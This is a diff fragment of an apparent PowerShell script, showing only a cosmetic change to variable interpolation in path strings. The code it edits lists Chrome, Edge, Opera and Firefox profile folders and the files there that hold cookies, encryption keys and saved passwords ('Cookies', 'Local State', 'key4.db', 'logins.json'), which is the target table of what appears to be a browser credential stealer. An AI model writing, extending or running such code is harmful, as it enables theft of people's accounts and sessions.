@@ -11,22 +11,22 @@ $roaming = $env:APPDATA
 $browsers = @(
     @{
         Name = "Chrome"
-        Path = "$local\Google\Chrome\User Data\Default"
+        Path = "${local}\Google\Chrome\User Data\Default"
         Files = @("Cookies", "Local State")
     },
     @{
         Name = "Edge"
-        Path = "$local\Microsoft\Edge\User Data\Default"
+        Path = "${local}\Microsoft\Edge\User Data\Default"
         Files = @("Cookies", "Local State")
     },
     @{
         Name = "Opera"
-        Path = "$local\Opera Software\Opera Stable"
+        Path = "${local}\Opera Software\Opera Stable"
         Files = @("Cookies", "Local State")
     },
     @{
         Name = "Firefox"
-        Path = "$roaming\Mozilla\Firefox\Profiles"
+        Path = "${roaming}\Mozilla\Firefox\Profiles"
         Match = "*.default-release"
         Files = @("cookies.sqlite", "key4.db", "logins.json", "cert9.db")
     }
